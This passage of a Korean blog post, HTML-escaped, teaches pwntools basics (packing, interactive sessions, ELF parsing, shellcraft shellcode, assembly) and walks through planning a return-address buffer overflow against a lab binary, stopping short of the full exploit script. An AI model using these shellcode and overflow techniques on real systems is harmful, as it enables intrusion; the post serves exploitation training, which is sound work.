  &lt;li&gt;원래 기능은 hex ↔ string&lt;/li&gt;
  &lt;li&gt;부가적 기능으로 엔디언을 바꾸는 데 사용한다.&lt;/li&gt;
  &lt;li&gt;패킹(hex → string)을 위한 함수: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p32()&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p64()&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;사용예: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p32(int, endian=&apos;big/little&apos;)&lt;/code&gt;&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
        
  &lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41424344&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# p64 사용법은 동일하므로 생략
&lt;/span&gt;        
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 결과: b&apos;DCBA&apos;
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 파라미터 추가 명시로 엔디언 변경 가능. 결과: b&apos;ABCD&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;언패킹(string → hex)을 위한 함수: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u32()&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u64()&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;사용예: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u32((uint32_t*)addr, endian=’big/little’)&lt;/code&gt; , 리턴값은 int 형식.&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
        
  &lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ABCD&quot;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# s64 사용법은 동일하므로 생략
&lt;/span&gt;        
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 결과: 0x44434241
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 결과: 0x41424344
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;5-interactive&quot;&gt;5. interactive&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;셸을 획득했거나, 익스플로잇의 특정 상황에 직접 입력을 주면서 출력을 확인하고 싶을 때 사용하는 함수.
    &lt;ul&gt;
      &lt;li&gt;쌍방 세션을 생성해 준다.&lt;/li&gt;
      &lt;li&gt;실제로 호출하면 터미널이 뜨게 되고, 거기에서 입력 및 출력이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pwnlib.tubes.ssh.ssh.interactive이고, process나 remote를 사용하면서 그 하위 메소드로 이용할 수 있다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;6-elf&quot;&gt;6. ELF&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-1/&quot;&gt;앞서 보았듯&lt;/a&gt;, ELF 파일의 헤더에는 각종 정보가 기록되어 있고, 이들은 높은 확률로 익스플로잇에 사용할 수 있다.&lt;/li&gt;
  &lt;li&gt;pwntools가 이런 정보들을 쉽게 참조할 수 있도록 보조해 준다.&lt;/li&gt;
  &lt;li&gt;[&lt;a href=&quot;http://docs.pwntools.com/en/latest/elf/elf.html?highlight=ELF&quot;&gt;자세한 메소드와 사용예&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;c1&quot;&gt;# 이하 ELF 메소드에 정의된 하위 메소드들 사용 가능
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;7-contextlog&quot;&gt;7. context.log&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;작성한 익스플로잇도 디버깅이 필요한데, 이때 사용하는 로깅 기능&lt;/li&gt;
  &lt;li&gt;로그 레벨은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;context.log_level&lt;/code&gt; 에 특정 값을 할당함으로써 조절 가능하다&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;error&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 에러만 출력
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;debug&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 대상 프로세스와 익스플로잇 간에 오가는 모든 데이터를 화면에 출력
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;info&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 비교적 중요한 정보들만 추려서 출력
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;8-contextarch&quot;&gt;8. context.arch&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;architecture의 준말&lt;/li&gt;
  &lt;li&gt;즉, 공격 대상의 아키텍처 정보를 프로그래머가 원하는 대로 지정할 수 있게 함으로써 호환성을 높임&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;amd64&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# x86-64
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i386&quot;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;arm&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;9-shellcraft&quot;&gt;9. shellcraft&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;셸코드를 작성해 익스플로잇을 수행하는 과정에서 상황에 따라 여러 제약 조건이 존재할 수 있다. 따라서, 이를 맞추기 위해 직접 셸코드를 작성해야 할 때가 있다.&lt;/li&gt;
  &lt;li&gt;pwntools에는 자주 사용되는 셸코드들이 저장되어 있어서 별다른 제약 조건이 없다면 꺼내 쓰면 된다.&lt;/li&gt;
  &lt;li&gt;amd64(x86-64) 타겟으로 생성할 수 있는 셸코드 목록: &lt;a href=&quot;https://docs.pwntools.com/en/stable/shellcraft/amd64.html&quot;&gt;여기&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 아키텍처 지정을 하지 않으면 이후 shellcraft.amd64.{} 식으로 명시해 줘야 한다.
&lt;/span&gt;    
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;10-asm&quot;&gt;10. asm&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;pwntools에서 제공하는 어셈블 기능&lt;/li&gt;
  &lt;li&gt;기계어로 어셈블하는 것이므로, 대상 아키텍처가 중요하다. 따라서, 아키텍처를 꼭 지정해 주고 시작한다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 셸을 실행하는 셸 코드를 기계어로 어셈블
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;결과:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pwntools-실습&quot;&gt;pwntools 실습&lt;/h1&gt;

&lt;p&gt;아래의 코드에서 get_shell() 함수를 실행시키는 것이 목적이다. (시스템 해킹의 목적은 셸을 딴 후 루트 권한을 탈취하는 것이기 때문이다)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;먼저 이전에 배웠던 내용을 다시 돌아볼 필요가 있다.&lt;/p&gt;

&lt;p&gt;어떤 함수의 스택 프레임이 생성될 때 직전까지 rip가 위치해 있던 함수의 스택 프레임과의 관계는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;또한 리눅스의 프로세스에게 할당되는 메모리 구조는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 배운 내용을 기반으로 하여 주어진 문제를 어떻게 해결할지 계획을 세워 보자.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;단계&lt;/strong&gt;&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;get_shell 함수의 시작 주소를 알아낸다.&lt;/li&gt;
    &lt;li&gt;유저가 익스플로잇을 수행할 수 있는 부분을 좁힌다.
      &lt;ol&gt;
        &lt;li&gt;“Input: “이 출력됐을 때 값을 입력하는 부분이 유일하게 유저가 프로세스와 소통할 수 있는 부분이다.&lt;/li&gt;
        &lt;li&gt;따라서 유저 입력값을 받을 때 malicious 한 입력값을 넣어야 한다.&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/li&gt;
    &lt;li&gt;현재 코드에서는 유저 입력값을 어디에 넣는지 확인한다.
      &lt;ol&gt;
        &lt;li&gt;buf[0x28]에 넣는 것으로 설정되어 있고, 입력값이 범위를 넘어가는 것을 차단하지 않는다.&lt;/li&gt;
        &lt;li&gt;따라서 BOF(Buffer OverFlow) 공격을 수행하는 것으로 결정한다.&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/li&gt;
    &lt;li&gt;유저가 입력값을 입력할 때 스택의 구조를 알아내어 현재 스택 프레임이 종료된 후 실행될 인스트럭션의 주소를 오염시킨다.&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;각 페이즈의 목적을 차근차근 달성해 보자.&lt;/p&gt;

&lt;h3 id=&quot;get_shell-함수의-시작-주소-알아내기&quot;&gt;get_shell() 함수의 시작 주소 알아내기&lt;/h3&gt;

&lt;p&gt;특정 프로그램을 구성하는 함수들은 프로세스가 메모리에 올라갈 때 한꺼번에 코드 세그먼트에 로딩된다. c 언어의 경우 위에서부터 아래로 컴파일되기 때문에, 함수가 코드 세그먼트에 로딩되는 순서는 코드가 쓰인 순서와 일치하게 된다. 즉, get_shell() 함수 다음에 main() 함수가 코드 세그먼트에 로딩된다.&lt;/p&gt;

&lt;p&gt;이제 gdb를 이용해 get_shell() 함수의 위치를 알아내 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;딱히 난독화하지 않았기 때문에 심볼이 그대로 살아 있다. 브레이크 포인트를 get_shell에 걺으로써 get_shell의 주소를 알아낼 수 있었다.&lt;/p&gt;

&lt;p&gt;추가적으로, main() 함수의 주소는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;코드상에서 get_shell보다 아래에 main이 쓰여 있었기 때문에 메모리의 코드 영역에도 main이 get_shell보다 뒤에 로딩된 것을 확인할 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;유저-입력값을-받을-당시-스택의-구조-확인하기&quot;&gt;유저 입력값을 받을 당시 스택의 구조 확인하기&lt;/h3&gt;

&lt;p&gt;위에서 짚어본 것처럼, 새롭게 콜된 함수의 스택 프레임과 이전 함수의 스택 프레임 간의 관계는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;스택에는 로컬 변수가 저장되기 때문에 우리가 BOF의 매개로 사용하는 buf[0x28] 변수 또한 스택에 있을 것을 예상하고 있다. 또한 변수는 선언된 순서대로 스택에 들어가므로 buf 변수는 main 함수의 rbp에 위치해 있을  것이다. 따라서 우리가 익스플로잇할 당시의 스택의 구조는 아래와 같다.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp-0x1]~[rbp-0x28]&lt;/strong&gt;: buf[0x28]&lt;/p&gt;

&lt;p&gt;================main() 스택 프레임 끝====================&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x7]~[rbp]&lt;/strong&gt;: start_main()의 rbp 주소(0x0000000000000000)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x0e]~[rbp+0x07]&lt;/strong&gt;: main()이 끝난 후 이어서 실행될 인스트럭션 주소&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;과연 추측이 맞는지 gdb를 붙여서 확인해 보자.&lt;/p&gt;

&lt;h3 id=&quot;실제-스택의-구조를-디버거로-확인하기&quot;&gt;실제 스택의 구조를 디버거로 확인하기&lt;/h3&gt;

&lt;p&gt;주어진 함수를 gcc로 컴파일할 때 스택 카나리를 끄고(-fno-stack-protector) PIE를 끔으로써 ASLR도 적용되지 않도록(-no-pie) 해두었기 때문에 아마 스택의 구조는 비교적 간단할 것이다. 목표 프로세스인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rao&lt;/code&gt; 에 gdb를 붙여서 사용자 입력값을 받고 저장하는 시점의 스택의 구조를 해당 시점에서의 rbp까지 포함되도록 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;흰색으로 하이라이트한 부분, 즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; 이 rbp이며, 스택의 구조 자체는 예상했던 바와 일치함을 확인할 수 있었다. 그러나, 딱 한 가지 다른 부분이 있었다.&lt;/p&gt;

&lt;p&gt;buf[0x28] 변수는 애초에 0x28 byte 만큼의 크기를 가지기 때문에 예상대로라면 buf[0x28]이 차지하는 주소는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf7e&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf58&lt;/code&gt; 이었어야 하지만, 실제로 확인한 결과는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf7e&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf50&lt;/code&gt; 이었다. 즉 8byte 만큼이 더 할당되어 있었다. buf[0x28] 이 실제로는 buf[0x30] 이었던 것이다.&lt;/p&gt;

&lt;p&gt;이 이유가 궁금해 알아보니, 스택 보호의 일환으로 c 컴파일러가 char 배열을 할당할 때 8byte 정도를 더 할당해 준다는 사실을 알 수 있었다. 단순히 이론상으로만 문제에 접근할 게 아니라 실제로 구동하는 상황에서의 메모리 구조를 확인한 이후 익스플로잇을 작성하는 게 좋겠다는 교훈을 얻을 수 있었다.&lt;/p&gt;

&lt;h3 id=&quot;익스플로잇-작성하기&quot;&gt;익스플로잇 작성하기&lt;/h3&gt;

&lt;p&gt;익스플로잇에서 프로세스에게 보낼 페이로드를 먼저 구상해 보자. 프로세스가 구동중일 때 실제 스택의 구조는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp-0x1]~[rbp-0x30]&lt;/strong&gt;: buf[0x28]                                                              //0x30 byte&lt;/p&gt;

&lt;p&gt;================main() 스택 프레임 끝====================&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x7]~[rbp]&lt;/strong&gt;: start_main()의 rbp 주소(0x0000000000000000)      //0x08 byte&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[rbp+0x0e]~[rbp+0x07]&lt;/strong&gt;: main()이 끝난 후 이어서 실행될 인스트럭션 주소  //0x08 byte&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;

&lt;p&gt;따라서 우리는 총 0x38 byte를 더미값으로 채운 후, 마지막 0x08 byte에 실행되길 원하는 get_shell() 함수의 시작 주소를 붙인 페이로드를 만들면 된다.&lt;/p&gt;

&lt;p&gt;이렇게 생성한 페이로드를 정상적으로 프로세스에 입력해줄 수 있는 python 스크립트를 만들어 실행하면 셸이 실행될 것이다. 여기에 해당 스크립트를 적고 자세한 분석 내용을 쓸까 고민했지만, 그렇게 하면 스포일러가 될지도 모르겠다는 생각이 들어 생략한다.&lt;/p&gt;

&lt;p&gt;다만, 우리가 이제까지 배운 pwn 라이브러리 상에서 문제를 해결할 수 있으며, 어떤 메소드가 어떤 형식의 값을 받아 어떤 형식의 값을 리턴하는지, 그리고 셸을 땄음을 어떻게 확인할 수 있을지를 생각하고 스크립트를 작성하는 것을 추천한다.&lt;/p&gt;
</description>
        <pubDate>Fri, 15 Jul 2022 18:25:23 +0900</pubDate>
